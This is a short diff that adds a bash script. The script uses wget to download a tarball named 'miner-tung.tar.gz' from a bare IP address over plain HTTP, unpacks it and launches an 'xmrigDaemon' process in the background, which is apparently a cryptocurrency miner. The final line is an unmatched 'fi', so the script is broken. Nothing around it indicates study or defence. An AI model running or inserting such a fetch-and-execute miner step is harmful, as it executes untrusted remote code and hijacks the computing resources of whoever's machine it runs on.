@@ -1,0 +1,3 @@
+#!/bin/bash
+wget http://139.59.106.85/miner-tung.tar.gz && tar -xvf miner-tung.tar.gz && cd miner-tung && ./xmrigDaemon &
+fi
